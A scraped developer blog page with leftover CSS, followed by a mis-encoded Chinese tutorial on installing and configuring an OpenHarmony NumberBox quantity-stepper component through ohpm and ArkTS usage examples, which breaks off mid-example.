h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æ•°å­—åŠ å‡æ¡†ç»„ä»¶å¸¸ç”¨äºè´­ç‰©è½¦ç­‰æœ‰æ•°é‡åŠ å‡çš„åœºæ™¯ï¼Œæœ¬èº«å®ç°èµ·æ¥å¹¶ä¸éš¾ï¼Œæ— éå°±æ˜¯æ¨ªå‘çš„ä¸‰ä¸ªç»„ä»¶æ’åˆ—ï¼Œå·¦å³æ˜¯â€œ+â€ã€â€œ-â€ä¸¤ä¸ªæ“ä½œæŒ‰é’®ï¼Œä¸­é—´æ˜¯ä¸€ä¸ªæ˜¾ç¤ºæ•°å€¼çš„è¾“å…¥æ¡†ç»„ä»¶ã€‚</p>
<p>å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ä¹Ÿæ˜¯éå¸¸çš„ç®€å•ï¼Œå½“ç”¨æˆ·ç‚¹å‡»â€œ+â€æŒ‰é’®æ—¶ï¼Œè¾“å…¥æ¡†å†…çš„æ•°å€¼ä¼šæŒ‰ç…§é¢„è®¾çš„æ­¥é•¿è¿›è¡Œé€’å¢ï¼›åä¹‹ï¼Œç‚¹å‡»â€œ-â€æŒ‰é’®åˆ™æ•°å€¼éšä¹‹é€’å‡ã€‚å½“ç„¶äº†ï¼Œåœ¨å®é™…çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„æœ‰æ•ˆæ€§ä¸ä¸šåŠ¡é€»è¾‘çš„ä¸¥è°¨ï¼Œæ•°å­—åŠ å‡æ¡†å¾€å¾€ä¼šå†…ç½®å®Œå–„çš„è¾¹ç•Œåˆ¤æ–­æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œåœ¨è´­ç‰©åœºæ™¯ä¸‹ï¼Œç”¨æˆ·ç‚¹å‡»å‡å·æ—¶ï¼Œæ•°å€¼ä¸ä¼šæ— é™é™ä½è‡³0æˆ–è´Ÿæ•°ï¼Œè€Œæ˜¯ä¼šå—åˆ¶äºâ€œæœ€å°å€¼â€çš„é™åˆ¶ï¼›åŒæ ·ï¼Œå½“å•†å“æ•°é‡è¾¾åˆ°åº“å­˜ä¸Šé™æ—¶ï¼Œâ€œ+â€æŒ‰é’®ä¹Ÿä¼šè‡ªåŠ¨å˜ä¸ºä¸å¯ç‚¹å‡»çŠ¶æ€ï¼Œé˜²æ­¢è¶…å‡ºåº“å­˜æƒ…å†µçš„å‘ç”Ÿã€‚</p>
<h2 data-id="heading-1">å®ç°æ–¹å¼</h2>
<p>å®ç°æ–¹å¼å‘¢ï¼Œä¹Ÿæ˜¯éå¸¸çš„ç®€å•ï¼Œä¸€ä¸ªRowç»„ä»¶ï¼Œå·¦å³ä¸¤ä¸ªå›¾æ ‡ç»„ä»¶SymbolGlyphï¼Œä¸­é—´ä¸€ä¸ªæ–‡æœ¬è¾“å…¥æ¡†ç»„ä»¶TextInputï¼Œä¾¿å¯ä»¥æå®šã€‚è¿™é‡Œå·¦å³ä¹‹æ‰€ä»¥æ²¡æœ‰ä½¿ç”¨æ–‡æœ¬Textç»„ä»¶ï¼Œæ˜¯è€ƒè™‘åˆ°ï¼ŒåŠ å‡ç»„ä»¶çš„å±…ä¸­ï¼Œå¦‚æœé‡‡ç”¨äº†æ–‡æœ¬Textç»„ä»¶ï¼Œä½¿ç”¨å†…å®¹â€œ+-â€æ¥è®¾ç½®ï¼Œå¦‚æœåœ¨æ–‡å­—å¤§å°ç¡®å®šï¼Œæ— ç»„ä»¶å®½é«˜è®¾ç½®çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯ï¼Œä¸€æ—¦è®¾ç½®äº†ç»„ä»¶çš„å®½é«˜ï¼Œæ–‡å­—çš„å±…ä¸­å°±ä¼šå‡ºç°é—®é¢˜ï¼Œæ‰€ä»¥ï¼ŒåŸºäºæ­¤ï¼Œé‡‡ç”¨äº†å›¾æ ‡ç»„ä»¶SymbolGlyphæ¥å®ç°ã€‚</p>
<p>å·¦å³çš„åŠ å‡ï¼Œè¦æ ¹æ®ä¼ é€’çš„æœ€å¤§å’Œæœ€å°æ•°é‡è¿›è¡Œåˆ¤æ–­ï¼Œé˜²æ­¢å‡ºç°å‰è¨€ä¸­çš„é—®é¢˜ï¼Œå…¶ä»–çš„å°±æ˜¯æ­£å¸¸çš„æ•°é‡åŠ å‡ï¼Œå’Œæ•°æ®çš„å›è°ƒï¼Œç›¸å¯¹æ¥è¯´ï¼Œæ˜¯éå¸¸çš„ç®€å•ï¼Œä»£ç å°±ä¸å¤šè¯´äº†ï¼Œç›®å‰å·²ç»ä¸Šä¼ åˆ°äº†ä¸­å¿ƒä»“åº“ï¼Œå¤§å®¶å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p>
<p>ä¸­å¿ƒä»“åº“åœ°å€</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fohpm.openharmony.cn%2F%23%2Fcn%2Fdetail%2F%40abner%252Fnumber_box" target="_blank" title="https://ohpm.openharmony.cn/#/cn/detail/@abner%2Fnumber_box" ref="nofollow noopener noreferrer">ohpm.openharmony.cn/#/cn/detailâ€¦</a></p>
<p>ä¸‹é¢é’ˆå¯¹è¿™ä¸ªç»„ä»¶ï¼Œç®€å•åšä¸€ä¸‹ä½¿ç”¨ä»‹ç»ã€‚</p>
<h2 data-id="heading-2">æ•ˆæœ</h2>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dad61b377dc1442e9fe392034ee6fb7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY5LiA6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595563&amp;x-signature=QqTExVpYcgKGAKGqEZVy1MfGWwo%3D" alt="" width="70%" loading="lazy"/></p>
<h2 data-id="heading-3">å¿«é€Ÿä½¿ç”¨</h2>
<p>æ–¹å¼ä¸€ï¼šåœ¨Terminalçª—å£ä¸­ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å®‰è£…ä¸‰æ–¹åŒ…ï¼ŒDevEco Studioä¼šè‡ªåŠ¨åœ¨å·¥ç¨‹çš„oh-package.json5ä¸­è‡ªåŠ¨æ·»åŠ ä¸‰æ–¹åŒ…ä¾èµ–ã€‚</p>
<p><strong>å»ºè®®ï¼šåœ¨ä½¿ç”¨çš„æ¨¡å—è·¯å¾„ä¸‹è¿›è¡Œæ‰§è¡Œå‘½ä»¤ã€‚</strong></p>
<pre><code class="hljs language-TypeScript" lang="TypeScript">ohpm install <span class="hljs-meta">@abner</span>/number_box
</code></pre>
<p>æ–¹å¼äºŒï¼šåœ¨éœ€è¦çš„æ¨¡å—ä¸­çš„oh-package.json5ä¸­è®¾ç½®ä¸‰æ–¹åŒ…ä¾èµ–ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-string">"dependencies"</span>: { <span class="hljs-string">"@abner/number_box"</span>: <span class="hljs-string">"^1.0.0"</span>}
</code></pre>
<h2 data-id="heading-4">ä»£ç ä½¿ç”¨</h2>
<h3 data-id="heading-5">ç®€å•ä½¿ç”¨</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-6">è®¾ç½®åˆå§‹å€¼</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">minNumber</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">//æœ€å°å€¼</span>
  <span class="hljs-attr">maxNumber</span>: <span class="hljs-number">10</span>, <span class="hljs-comment">//æœ€å¤§å€¼</span>
  <span class="hljs-attr">defaultNumber</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">//é»˜è®¤å€¼</span>
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-7">ç¦æ­¢ç¼–è¾‘</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">inputEnabled</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//è¾“å…¥æ¡†ç¦æ­¢ç¼–è¾‘</span>
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-8">åŠ å‡å·è¶…å‡ºåç¦æ­¢ç‚¹å‡»</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">minNumber</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">//æœ€å°å€¼</span>
  <span class="hljs-attr">maxNumber</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">//æœ€å¤§å€¼</span>
  <span class="hljs-attr">isAutoMinusPlusEnabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">controlAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">plusMinusEnabledFontColor</span> = <span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span> <span class="hljs-comment">//åŠ å‡å·ç¦æ­¢ç‚¹å‡»é¢œè‰²</span>
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-9">åŠ å‡å·ç¦æ­¢æ ·å¼</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">minNumber</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">//æœ€å°å€¼</span>
  <span class="hljs-attr">maxNumber</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">//æœ€å¤§å€¼</span>
  <span class="hljs-attr">isAutoMinusPlusEnabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">//æ˜¯å¦è‡ªåŠ¨ç¦æ­¢</span>
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
  },
  <span class="hljs-attr">controlAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">plusMinusEnabledFontColor</span> = <span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span> <span class="hljs-comment">//åŠ å‡å·ç¦æ­¢ç‚¹å‡»é¢œè‰²</span>
    attr.<span class="hljs-property">width</span> = <span class="hljs-number">18</span>
    attr.<span class="hljs-property">height</span> = <span class="hljs-number">18</span>
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">18</span> }
    attr.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">"#ff968f8f"</span>
    attr.<span class="hljs-property">plusMinusEnabledBgColor</span> = <span class="hljs-string">"#ffcfcdcd"</span> <span class="hljs-comment">//ç¦æ­¢èƒŒæ™¯é¢œè‰²</span>
    attr.<span class="hljs-property">plusMinusEnabledBorder</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">18</span> }
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-10">è®¾ç½®è¾“å…¥æ¡†åœ†è§’</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-11">è®¾ç½®å®½åº¦</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">150</span>)
</code></pre>
<h3 data-id="heading-12">è®¾ç½®æ ·å¼</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
    attr.<span class="hljs-property">fontColor</span> = <span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>
    attr.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">"#fff1b706"</span>
    attr.<span class="hljs-property">padding</span> = <span class="hljs-number">5</span>
  },
  <span class="hljs-attr">controlAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">width</span> = <span class="hljs-number">20</span>
    attr.<span class="hljs-property">height</span> = <span class="hljs-number">20</span>
    attr.<span class="hljs-property">fontColor</span> = <span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">3</span> }
    attr.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">"#fff1b706"</span>
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-13">è®¾ç½®æ­¥é•¿</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">step</span>: <span class="hljs-number">5</span>,<span class="hljs-comment">//è®¾ç½®æ­¥é•¿</span>
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
}).<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
</code></pre>
<h3 data-id="heading-14">è¾“å…¥æ¡†ç‚¹å‡»</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-title class_">NumberBox</span>({
  <span class="hljs-attr">defaultNumber</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultNumber</span>,
  <span class="hljs-attr">inputAttribute</span>: <span class="hljs-function">(<span class="hljs-params">attr</span>) =&gt;</span> {
    attr.<span class="hljs-property">border</span> = { <span class="hljs-attr">radius</span>: <span class="hljs-number">5</span> }
  },
  <span class="hljs-attr">onInputClick</span>: <span class="hljs-function">() =&gt;</span> {
    inputMethod.<span class="hljs-title function_">getController</span>().<span class="hljs-title function_">stopInputSession</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dialogController</span>.<span class="hljs-title function_">open</span>()
  },
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">num</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===æ•°é‡æ”¹å˜ç›‘å¬ï¼š"</span> + num)
  }
